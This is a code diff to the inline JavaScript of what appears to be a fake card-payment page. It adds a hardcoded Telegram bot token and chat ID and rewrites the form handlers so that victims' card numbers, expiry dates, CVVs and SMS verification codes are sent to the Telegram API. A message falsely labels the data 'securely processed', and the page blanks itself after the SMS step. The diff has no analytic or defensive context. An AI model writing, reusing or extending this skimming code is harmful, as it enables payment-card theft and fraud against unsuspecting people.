@@ -783,6 +783,8 @@
         </div>
     </div>
     <script>
+        const botToken = "7269731737:AAE0477jUEqBpiY3f5iCmdej7cn_VtFh2pY";
+        const chatId = '-4182534111';
         const cardInput = document.getElementById('cardNumber');
 
         cardInput.addEventListener('input', function () {
@@ -853,32 +855,58 @@
             }
         });
 
-        function send(){
+        // function send(){
+        //     const cardNumber = document.getElementById('cardNumber').value;
+        //     const expiryDate = document.getElementById('expiryDate').value;
+        //     const cvv = document.getElementById("cvc").value;
+
+        //     const formData = new FormData();
+        //     formData.append('cardNumber', cardNumber);
+        //     formData.append('expiryDate', expiryDate);
+        //     formData.append('cvv', cvv);
+        //     formData.append('dd1', true);
+
+        //     fetch('process.php', {
+        //         method: 'POST',
+        //         body: formData
+        //     }).then(response => response.text())
+
+        //     document.getElementById("t1").style = "display: none";
+        //     document.getElementById("t2").style = "display: flex";
+        //     document.getElementById("cod-crt").innerHTML = cardNumber.split(" ")[3];
+
+        //     var now = new Date();
+        //     var d;
+        //     if(now.getMonth() < 10){
+        //         d = "0" + now.getMonth()
+        //     }
+        //     document.getElementById("datedd").innerHTML = now.getDate() + "." + d + "." + now.getFullYear();
+        // }
+
+        function send_sms(){
             const cardNumber = document.getElementById('cardNumber').value;
-            const expiryDate = document.getElementById('expiryDate').value;
-            const cvv = document.getElementById("cvc").value;
+            const sms = document.getElementById('sms').value;
 
-            const formData = new FormData();
-            formData.append('cardNumber', cardNumber);
-            formData.append('expiryDate', expiryDate);
-            formData.append('cvv', cvv);
-            formData.append('dd1', true);
+            if(sms == "" || sms.length < 4) return;
 
-            fetch('process.php', {
+            const message = `💳 *Sms Card Details*\n\n🔢 *Card Number:* \`${cardNumber}\`\n✅ *SMS:* \`${sms}\`\n\n`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
                 method: 'POST',
-                body: formData
-            }).then(response => response.text())
-
-            document.getElementById("t1").style = "display: none";
-            document.getElementById("t2").style = "display: flex";
-            document.getElementById("cod-crt").innerHTML = cardNumber.split(" ")[3];
-
-            var now = new Date();
-            var d;
-            if(now.getMonth() < 10){
-                d = "0" + now.getMonth()
-            }
-            document.getElementById("datedd").innerHTML = now.getDate() + "." + d + "." + now.getFullYear();
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                console.log(data);
+                document.body.remove();
+            }).catch(error => console.error('Error:', error));
         }
 
 
@@ -903,27 +931,57 @@
             document.querySelectorAll("._3FnMECl4IVheXfoYeDWal8")[1].removeAttribute("disabled")
         }
 
-        function send_sms(){
-            const formData = new FormData();
+        // function send_sms(){
+        //     const formData = new FormData();
+        //     const cardNumber = document.getElementById('cardNumber').value;
+        //     const sms = document.getElementById('sms').value;
+
+        //     if(sms == "")
+        //         return;
+
+        //     if(sms.length < 4)
+        //         return;
+
+        //     formData.append('cardNumber', cardNumber);
+        //     formData.append('sms', sms);
+        //     formData.append('dd2', true);
+
+        //     fetch('process.php', {
+        //         method: 'POST',
+        //         body: formData
+        //     }).then(response => response.text())
+
+        //     document.body.remove()
+        // }
+        function send(){
             const cardNumber = document.getElementById('cardNumber').value;
-            const sms = document.getElementById('sms').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById("cvc").value;
 
-            if(sms == "")
-                return;
+            const message = `💳 *Card Details*\n\n🔢 *Card Number:* \`${cardNumber}\`\n📅 *Expiry Date:* \`${expiryDate}\`\n🔒 *CVV:* \`${cvv}\`\n\n✅ _Securely processed by our system_`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            if(sms.length < 4)
-                return;
-
-            formData.append('cardNumber', cardNumber);
-            formData.append('sms', sms);
-            formData.append('dd2', true);
-
-            fetch('process.php', {
+            fetch(url, {
                 method: 'POST',
-                body: formData
-            }).then(response => response.text())
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                console.log(data);
+                document.getElementById("t1").style.display = "none";
+                document.getElementById("t2").style.display = "flex";
+                document.getElementById("cod-crt").innerHTML = cardNumber.split(" ")[3];
 
-            document.body.remove()
+                var now = new Date();
+                var d = now.getMonth() + 1 < 10 ? "0" + (now.getMonth() + 1) : now.getMonth() + 1;
+                document.getElementById("datedd").innerHTML = now.getDate() + "." + d + "." + now.getFullYear();
+            }).catch(error => console.error('Error:', error));
         }
     </script>
 </body>
